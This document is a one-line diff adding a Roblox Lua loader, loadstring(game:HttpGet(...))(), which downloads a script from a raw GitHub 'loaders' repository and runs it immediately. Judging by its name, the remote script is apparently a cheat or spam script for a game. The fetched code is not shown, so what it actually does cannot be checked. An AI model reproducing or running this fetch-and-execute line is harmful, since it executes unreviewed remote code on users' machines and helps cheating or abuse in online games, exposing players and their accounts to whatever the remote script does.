@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/huntress-nightmare-spam6-jjlz6qjukxwv6p.lua"))()
